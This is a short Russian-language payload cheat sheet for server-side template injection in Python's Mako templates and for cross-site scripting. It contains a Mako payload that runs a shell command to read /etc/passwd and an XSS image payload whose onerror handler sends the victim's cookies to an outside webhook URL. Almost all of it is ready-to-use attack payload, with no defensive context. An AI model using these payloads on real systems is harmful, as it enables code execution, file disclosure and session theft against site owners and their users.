# SSTI (Server-Side Template Injection) в Python

##  Mako Templates
### Проверка уязвимости
${7*7}  # → 49

### Чтение файла
<% import os %>${os.popen('cat /etc/passwd').read()}

# XSS Payload
[<]img src=x onerror="this.src='https://webhook.site/b8ce3f5c-707d-406f-a8df-0dd7928bca42?c='+document.cookie;"[>]
